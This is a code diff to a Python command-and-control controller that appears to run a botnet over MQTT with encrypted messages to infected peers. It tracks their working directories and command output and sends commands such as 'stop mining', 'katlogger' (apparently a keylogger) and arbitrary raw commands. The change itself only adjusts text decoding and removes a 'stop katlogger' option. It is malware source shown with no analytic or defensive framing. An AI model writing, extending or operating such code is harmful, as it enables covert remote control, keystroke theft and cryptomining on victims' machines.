@@ -68,7 +68,7 @@ def send_control_command(command):
 def on_message(c, u, msg):
     try:
         topic = msg.topic
-        payload = msg.payload.decode()
+        payload = msg.payload.decode('utf-8')
         if topic.startswith("meta/"):
             pid = topic.split("/",1)[1]
             if pid != CONTROLLER_ID:
@@ -84,7 +84,7 @@ def on_message(c, u, msg):
             if not sender_pub: return
             box = Box(sk, PublicKey(sender_pub.encode(), encoder=Base64Encoder))
             pt = box.decrypt(base64.b64decode(enc_b64))
-            obj = json.loads(pt.decode())
+            obj = json.loads(pt.decode('utf-8'))
             rid = obj.get("id"); t = obj.get("type")
             if t == "cwd": peers_cwd[sender]=obj.get("cwd"); print(Fore.YELLOW + f"[{sender}] CWD updated: {obj.get('cwd')}" + Fore.RESET)
             elif t=="cmd_output":
@@ -131,8 +131,6 @@ def cli_loop():
             send_control_command("stop mining")
         elif cmd.startswith("katlogger"):
             send_control_command("katlogger")
-        elif cmd == "stop katlogger":
-            send_control_command("stop katlogger")
         elif cmd.startswith("raw "):
             send_raw(cmd[4:].strip())
         elif cmd in ("exit","quit"): break
@@ -163,4 +161,3 @@ except KeyboardInterrupt: pass
 
 client.loop_stop()
 client.disconnect()
-
